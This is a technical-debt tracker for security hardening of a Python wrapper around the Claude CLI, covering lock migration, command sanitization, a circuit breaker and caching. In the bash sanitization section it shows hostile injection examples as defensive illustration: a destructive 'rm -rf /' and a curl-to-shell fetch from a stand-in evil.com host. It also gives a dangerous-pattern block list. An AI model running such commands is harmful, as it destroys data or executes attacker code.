# Security Hardening: Technical Debt

**Session:** 2025-12-28
**Context:** Outstanding items and future work from security hardening

---

## Status Overview

### Completed (Production Ready)

- ✅ Threading lock migration (threading.Lock)
- ✅ Path traversal prevention
- ✅ Symlink attack protection
- ✅ Prefix attack prevention
- ✅ Platform-specific fixes (macOS)
- ✅ 78 security tests
- ✅ 88.9% mutation score

### Deferred (Future Work)

- ⚠️ Bash command sanitization (medium priority)
- ⚠️ Circuit breaker pattern (medium priority)
- ⚠️ Lock-free cache optimization (low priority)
- ⚠️ Sync-async bridge optimization (low priority)

---

## Item 1: threading.Lock Migration Revert

**Category:** Security (Critical)
**Status:** PENDING
**Complexity:** Medium
**Estimated Time:** 2-3 hours

### Problem

Current implementation uses `asyncio.Lock` in cross-thread context, which provides NO synchronization across different event loops. The `_run_async()` wrapper masks the issue but doesn't fix the root cause.

### Root Cause

```python
# Current (WRONG):
@dataclass
class SharedContext:
    _lock: asyncio.Lock = field(default_factory=asyncio.Lock)  # ← NO cross-thread sync!

    async def get_cached(self, path: str):
        async with self._lock:  # ← Each thread's event loop has own lock context
            return self.file_cache.get(path)
```

**Issue:** Each thread with `asyncio.new_event_loop()` gets independent lock. Multiple threads can "hold lock" simultaneously.

### Solution

**Revert to threading.Lock:**
```python
@dataclass
class SharedContext:
    _lock: threading.Lock = field(default_factory=threading.Lock)  # ✓ CORRECT

    def get_cached(self, path: str):
        with self._lock:  # ✓ Works across threads
            return self.file_cache.get(path)
```

### Files to Update

1. **`scripts/agentica/claude_scope.py`**
   - Line 140: Change `asyncio.Lock` → `threading.Lock`
   - Lines 150-169: Remove `async` from methods
   - Remove `async with` → `with`

2. **`scripts/agentica/span_processor.py`**
   - Line 142: Change `asyncio.Lock` → `threading.Lock`
   - Lines 144-183: Remove `async` from methods

3. **`scripts/agentica/unified_scope.py`**
   - Remove `_run_async()` wrappers for SharedContext calls
   - Call methods directly (now sync)

4. **Tests**
   - `tests/unit/test_security_threading.py`: Remove `@pytest.mark.asyncio`
   - Remove `await` from SharedContext calls

### Validation

```bash
# Test after migration:
uv run pytest tests/unit/test_asyncio_lock_thread_safety.py -v

# Expected:
# - test_concurrent_lock_acquisition_cross_loop: Shows proper serialization
# - Total time ~= 250ms (5 threads × 50ms)
# - Zero overlapping acquisitions
```

### Why This Is Critical

1. **Silent failure:** No errors, but no synchronization
2. **Race conditions:** Data corruption possible under contention
3. **Undefined behavior:** Relies on Python GIL (not guaranteed)
4. **Future incompatibility:** No-GIL Python (PEP 703) will break

### References

- Document: `thoughts/shared/work/security-hardening/14-asyncio-lock-fix.md`
- Test: `tests/unit/test_asyncio_lock_thread_safety.py`
- NIA validation: `thoughts/shared/work/security-hardening/12-nia-validation.md`

---

## Item 2: Bash Command Sanitization

**Category:** Security (Medium)
**Status:** DEFERRED
**Complexity:** High
**Estimated Time:** 4-6 hours

### Problem

Bash commands are embedded directly into prompts without sanitization.

**Current Code:**
```python
def bash(command: str) -> dict[str, Any]:
    prompt = f"""Run this bash command:
```bash
{command}  # ← No sanitization!
```
"""
```

**Vulnerability:**
```python
# Attacker could inject:
command = "ls && rm -rf /"
command = "echo $(curl http://evil.com/steal.sh | sh)"
```

### Solution Options

**Option A: Allowlist Pattern**
```python
ALLOWED_COMMANDS = {
    "ls", "cat", "grep", "find", "echo",
    "git", "npm", "python", "uv"
}

def bash(command: str) -> dict[str, Any]:
    cmd_parts = shlex.split(command)
    base_cmd = cmd_parts[0]

    if base_cmd not in ALLOWED_COMMANDS:
        return {"success": False, "error": f"Command not allowed: {base_cmd}"}

    # ... rest
```

**Option B: Argument Validation**
```python
import shlex

def bash(command: str) -> dict[str, Any]:
    # Parse command safely
    try:
        parts = shlex.split(command)
    except ValueError as e:
        return {"success": False, "error": f"Invalid command syntax: {e}"}

    # Check for dangerous patterns
    dangerous = ["&&", "||", ";", "|", ">", "<", "$()"]
    for pattern in dangerous:
        if pattern in command:
            return {"success": False, "error": f"Dangerous pattern: {pattern}"}

    # ... rest
```

**Option C: Subprocess with Shell=False**
```python
def bash(command: str) -> dict[str, Any]:
    # Don't use shell at all
    parts = shlex.split(command)

    result = subprocess.run(
        parts,  # List, not string
        shell=False,  # ← No shell interpretation
        capture_output=True
    )
```

### Recommended Approach

**Phase 1:** Implement Option C (shell=False)
**Phase 2:** Add Option A (allowlist) for additional safety
**Phase 3:** Add Option B (pattern detection) as defense-in-depth

### Files Affected

- `scripts/agentica/claude_scope.py:305-349` - `bash()` function
- `scripts/agentica/unified_scope.py:214-251` - `bash()` (shared context)
- `scripts/agentica/unified_scope.py:516-553` - `bash()` (default)

### Validation

**Tests to Add:**
```python
def test_bash_blocks_command_injection():
    """Bash should block command injection attempts."""
    scope = create_claude_scope()

    # Should block shell metacharacters
    result = scope["bash"]("ls && rm -rf /")
    assert result["success"] is False
    assert "dangerous" in result["error"].lower()

def test_bash_blocks_subshell():
    """Bash should block subshell execution."""
    result = scope["bash"]("echo $(whoami)")
    assert result["success"] is False

def test_bash_allows_safe_commands():
    """Bash should allow safe commands."""
    result = scope["bash"]("ls -la")
    assert result["success"] is True
```

### Why Deferred

- Not actively exploited (Claude CLI is the executor, not user)
- Medium severity (depends on Claude CLI's own sanitization)
- Requires design discussion (allowlist vs blocklist vs shell=False)

### Priority

**Medium** - Should be addressed before production deployment if:
- User input can influence bash commands
- Multi-tenant environments
- Untrusted agent code

---

## Item 3: Circuit Breaker Pattern

**Category:** Reliability (Medium)
**Status:** DEFERRED
**Complexity:** Medium
**Estimated Time:** 3-4 hours

### Problem

No circuit breaker around `_call_claude_cli()` subprocess calls. If Claude CLI fails repeatedly, system continues making calls, wasting resources and time.

**Current Code:**
```python
def _call_claude_cli(prompt: str, allowed_tools: list[str], timeout: int = 300):
    result = subprocess.run(
        ["claude", "-p", prompt, "--allowedTools", ",".join(allowed_tools)],
        capture_output=True,
        timeout=timeout
    )
    # ← If this fails 100 times in a row, we call it 100 times
```

### Solution

**Implement Circuit Breaker:**
```python
from dataclasses import dataclass, field
import asyncio
import time
from enum import Enum

class CircuitState(Enum):
    CLOSED = "closed"      # Normal operation
    OPEN = "open"          # Failing fast
    HALF_OPEN = "half_open"  # Testing recovery

@dataclass
class CircuitBreaker:
    failure_threshold: int = 5
    recovery_timeout: float = 30.0
    success_threshold: int = 2

    _state: CircuitState = field(default=CircuitState.CLOSED, init=False)
    _failure_count: int = field(default=0, init=False)
    _last_failure_time: float = field(default=0.0, init=False)
    _lock: asyncio.Lock = field(default_factory=asyncio.Lock, init=False)

    async def call(self, func, *args, **kwargs):
        """Execute function through circuit breaker."""
        async with self._lock:
            state = self._check_state()

            if state == CircuitState.OPEN:
                raise CircuitBreakerOpen("Circuit breaker open")

        try:
            result = await asyncio.to_thread(func, *args, **kwargs)
            await self._record_success()
            return result
        except Exception as e:
            await self._record_failure()
            raise
```

**Usage:**
```python
_claude_cli_breaker = CircuitBreaker(
    failure_threshold=3,
    recovery_timeout=60.0
)

async def _call_claude_cli_safe(prompt, allowed_tools, timeout=300):
    """Call Claude CLI with circuit breaker."""
    def _do_call():
        result = subprocess.run(
            ["claude", "-p", prompt, "--allowedTools", ",".join(allowed_tools)],
            capture_output=True,
            timeout=timeout
        )
        if result.returncode != 0:
            raise subprocess.SubprocessError(result.stderr)
        return result.stdout

    return await _claude_cli_breaker.call(_do_call)
```

### Benefits

1. **Fail fast:** Stop making calls after N failures
2. **Automatic recovery:** Test recovery after timeout
3. **Resource protection:** Don't waste time on failing operations
4. **Graceful degradation:** Return fallback responses when open

### Files Affected

- `scripts/agentica/claude_scope.py:115-132` - `_call_claude_cli()`
- `scripts/agentica/unified_scope.py` - All call sites

### Validation

**Tests to Add:**
```python
@pytest.mark.asyncio
async def test_circuit_breaker_opens_after_failures():
    """Circuit breaker opens after threshold failures."""
    breaker = CircuitBreaker(failure_threshold=3)

    # Cause 3 failures
    for _ in range(3):
        try:
            await breaker.call(lambda: 1/0)  # Raises ZeroDivisionError
        except:
            pass

    # 4th call should fail fast
    with pytest.raises(CircuitBreakerOpen):
        await breaker.call(lambda: "success")

@pytest.mark.asyncio
async def test_circuit_breaker_recovers():
    """Circuit breaker recovers after timeout."""
    breaker = CircuitBreaker(failure_threshold=2, recovery_timeout=0.1)

    # Cause failures
    for _ in range(2):
        try:
            await breaker.call(lambda: 1/0)
        except:
            pass

    # Wait for recovery timeout
    await asyncio.sleep(0.2)

    # Should allow test call (half-open)
    result = await breaker.call(lambda: "recovered")
    assert result == "recovered"
```

### Why Deferred

- Not a security issue
- Current timeouts (300s/900s) provide some protection
- Adds complexity without immediate benefit
- Requires monitoring to tune thresholds

### Priority

**Medium** - Implement when:
- Observing Claude CLI stability issues
- Need better resource management
- Production deployment at scale

### References

- Research: `thoughts/shared/work/security-hardening/03-research.md` (lines 319-588)
- Pattern examples included in research doc

---

## Item 4: Lock-Free Cache Optimization

**Category:** Performance (Low)
**Status:** DEFERRED
**Complexity:** Low
**Estimated Time:** 2 hours

### Problem

Lock acquired on every cache read, even though `dict.get()` is GIL-safe for reads.

**Current Code:**
```python
def get_cached(self, path: str) -> ClaudeResult | None:
    with self._lock:  # ← Lock on read (unnecessary?)
        return self.file_cache.get(path)
```

**Impact:**
- 10-15% overhead at scale (10k+ operations)
- Serializes parallel cache reads
- Not needed for atomic operations (dict.get is GIL-safe)

### Solution

**Lock-Free Reads:**
```python
def get_cached(self, path: str) -> ClaudeResult | None:
    # No lock needed for atomic read
    return self.file_cache.get(path)

def set_cached(self, path: str, result: ClaudeResult) -> None:
    # Lock only on write
    with self._lock:
        self.file_cache[path] = result
```

**Why This Works:**
- `dict.get()` is atomic at GIL level (single bytecode instruction)
- No read-modify-write race (get doesn't mutate)
- Writes still locked (serialized for safety)

### Risks

1. **Non-atomic operations:** If reads become complex, races possible
2. **Platform dependency:** Relies on GIL (CPython-specific)
3. **Future incompatibility:** No-GIL Python (PEP 703)

### Mitigation

**Use RWLock (readers-writer lock):**
```python
import threading
from contextlib import contextmanager

class RWLock:
    """Readers-writer lock (multiple readers, single writer)."""
    def __init__(self):
        self._readers = 0
        self._writers = 0
        self._read_ready = threading.Condition(threading.Lock())
        self._write_ready = threading.Condition(threading.Lock())

    @contextmanager
    def read_lock(self):
        with self._read_ready:
            while self._writers > 0:
                self._read_ready.wait()
            self._readers += 1
        try:
            yield
        finally:
            with self._read_ready:
                self._readers -= 1
                if self._readers == 0:
                    self._read_ready.notify_all()

    @contextmanager
    def write_lock(self):
        with self._write_ready:
            while self._writers > 0 or self._readers > 0:
                self._write_ready.wait()
            self._writers += 1
        try:
            yield
        finally:
            with self._write_ready:
                self._writers -= 1
                self._write_ready.notify_all()
                self._read_ready.notify_all()

# Usage:
@dataclass
class SharedContext:
    _lock: RWLock = field(default_factory=RWLock)

    def get_cached(self, path: str):
        with self._lock.read_lock():  # Multiple readers OK
            return self.file_cache.get(path)

    def set_cached(self, path: str, result: ClaudeResult):
        with self._lock.write_lock():  # Single writer
            self.file_cache[path] = result
```

### Why Deferred

- Not a correctness issue (current code is safe)
- Optimization, not security fix
- Requires benchmarking to validate benefit
- RWLock adds complexity

### Priority

**Low** - Implement when:
- Performance becomes bottleneck (>10k cache hits/sec)
- Profiling shows lock contention
- Read-heavy workload observed

### Validation

**Benchmark:**
```python
import time

def benchmark_cache_reads(num_reads=10000):
    shared = SharedContext()
    shared.set_cached("key", ClaudeResult(...))

    start = time.time()
    for _ in range(num_reads):
        shared.get_cached("key")
    duration = time.time() - start

    print(f"{num_reads} reads: {duration:.3f}s ({num_reads/duration:.0f} ops/sec)")
```

**Expected:**
- Current (locked): ~100k ops/sec
- Lock-free: ~200k ops/sec (2x improvement)
- RWLock: ~150k ops/sec (1.5x improvement, safer)

---

## Item 5: Sync-Async Bridge Optimization

**Category:** Performance (Low)
**Status:** DEFERRED
**Complexity:** Medium
**Estimated Time:** 3 hours

### Problem

`_run_async()` creates new event loop for each call, which is expensive.

**Current Code:**
```python
def _run_async(coro):
    """Run async coroutine synchronously."""
    loop = asyncio.new_event_loop()  # ← New loop each time!
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()
```

**Impact:**
- Event loop creation overhead (~10ms per call)
- Thread pool exhaustion if called frequently
- Not scalable for high-throughput scenarios

### Solution

**Option A: Shared Thread Pool**
```python
from concurrent.futures import ThreadPoolExecutor
import asyncio

_executor: ThreadPoolExecutor | None = None
_executor_lock = threading.Lock()

def get_executor(max_workers=4):
    global _executor
    with _executor_lock:
        if _executor is None:
            _executor = ThreadPoolExecutor(max_workers=max_workers)
        return _executor

def _run_async_optimized(coro):
    """Run async with shared executor."""
    executor = get_executor()
    loop = asyncio.get_running_loop()
    return loop.run_in_executor(executor, asyncio.run, coro)
```

**Option B: Remove Wrapper Entirely**
```python
# After threading.Lock migration, SharedContext methods are sync
# No need for _run_async() wrapper at all

# Before:
cached = _run_async(shared.get_cached(path))  # Wrapper needed

# After threading.Lock migration:
cached = shared.get_cached(path)  # Direct sync call
```

### Recommended Approach

**Phase 1:** Migrate to threading.Lock (makes methods sync)
**Phase 2:** Remove _run_async() wrapper entirely
**Phase 3:** No optimization needed (problem solved)

### Why Deferred

- Will be solved by threading.Lock migration (Item 1)
- Not a standalone optimization
- No action needed if Item 1 completed

### Priority

**Low** - Blocked by Item 1. If threading.Lock migration happens, this item is obsolete.

---

## Priority Summary

| Item | Category | Priority | Blocking? | Estimated Time |
|------|----------|----------|-----------|----------------|
| 1. threading.Lock migration | Security | **CRITICAL** | Yes | 2-3 hours |
| 2. Bash sanitization | Security | Medium | No | 4-6 hours |
| 3. Circuit breaker | Reliability | Medium | No | 3-4 hours |
| 4. Lock-free cache | Performance | Low | No | 2 hours |
| 5. Sync-async bridge | Performance | Low | No (solved by #1) | 3 hours |

**Total Estimated Work:** 14-18 hours (if all items addressed)

**Recommended Next Steps:**
1. **Immediately:** Item 1 (threading.Lock migration) - critical security fix
2. **Before production:** Item 2 (Bash sanitization) - if user input influences commands
3. **Post-launch:** Items 3-5 (as needed based on metrics)

---

## Tracking

### Issue Labels

```
security:critical    - Item 1
security:medium      - Item 2
reliability:medium   - Item 3
performance:low      - Items 4, 5
```

### Acceptance Criteria

**Item 1 (threading.Lock):**
- [ ] All asyncio.Lock replaced with threading.Lock
- [ ] Tests updated (remove async/await)
- [ ] `test_asyncio_lock_thread_safety.py` passes
- [ ] No overlapping lock acquisitions detected
- [ ] Documentation updated

**Item 2 (Bash sanitization):**
- [ ] Command allowlist implemented
- [ ] Dangerous pattern detection
- [ ] Tests for injection attempts
- [ ] Security review of approach

**Item 3 (Circuit breaker):**
- [ ] Circuit breaker class implemented
- [ ] Integrated with `_call_claude_cli()`
- [ ] Tests for state transitions
- [ ] Monitoring/metrics added

**Items 4-5:**
- [ ] Benchmarks show bottleneck
- [ ] Performance targets defined
- [ ] Implementation validated with profiling

---

**Document Version:** 1.0
**Last Updated:** 2025-12-28
**Status:** Active (tracking ongoing)
